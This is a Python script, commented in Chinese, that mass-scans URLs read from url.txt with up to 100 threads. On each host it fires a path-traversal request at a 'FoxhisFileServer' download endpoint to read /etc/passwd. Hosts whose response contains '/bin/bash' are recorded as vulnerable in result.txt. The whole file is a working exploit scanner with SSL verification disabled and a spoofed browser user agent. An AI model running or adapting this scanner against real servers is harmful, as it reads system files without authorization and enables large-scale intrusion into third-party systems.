import requests
import threading
from urllib.parse import urljoin
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁
file_lock = threading.Lock()

def check_vulnerability(url, results_file):
    """
    检查单个URL是否存在漏洞
    """
    try:
        # 构造完整的URL路径
        vuln_path = "/FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd"
        target_url = urljoin(url.rstrip('/') + '/', vuln_path.lstrip('/'))
        
        # 设置请求头
        headers = {
            'Host': url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0],
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept': '*/*',
            'Connection': 'Keep-Alive'
        }
        
        # 发送GET请求，禁用SSL验证，不跟随重定向
        response = requests.get(
            target_url,
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        # 检查状态码
        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            return
        
        # 检查漏洞条件
        if response.status_code == 200:
            if '/bin/bash' in response.text:
                # 发现漏洞，写入文件
                vulnerability_info = f"""
存在漏洞的URL: {target_url}
状态码: {response.status_code}
响应内容片段: {response.text[:200]}...
发现时间: {threading.current_thread().name}
{'='*50}
"""
                with file_lock:
                    with open(results_file, 'a', encoding='utf-8') as f:
                        f.write(vulnerability_info)
                print(f"[VULNERABLE] {url} - 存在漏洞，详情已写入 {results_file}")
            else:
                print(f"[INFO] {url} - 状态码 200，但未找到 /bin/bash，不存在漏洞")
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")

def main():
    # 输入和输出文件
    url_file = "url.txt"
    results_file = "result.txt"
    
    try:
        # 读取URL列表
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("url.txt 文件中没有找到有效的URL")
            return
        
        print(f"共读取到 {len(urls)} 个URL，开始检测...")
        
        # 清空结果文件
        with open(results_file, 'w', encoding='utf-8') as f:
            f.write("漏洞检测结果\n")
            f.write("=" * 50 + "\n")
        
        # 创建线程池
        threads = []
        max_threads = 100
        
        for url in urls:
            # 等待直到有可用的线程槽位
            while threading.active_count() > max_threads:
                threading.Event().wait(0.1)
            
            # 创建并启动线程
            thread = threading.Thread(
                target=check_vulnerability,
                args=(url, results_file),
                name=f"Thread-{len(threads)+1}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        print("检测完成！")
        
    except FileNotFoundError:
        print(f"错误：找不到 {url_file} 文件")
    except Exception as e:
        print(f"发生错误: {str(e)}")

if __name__ == "__main__":
    main()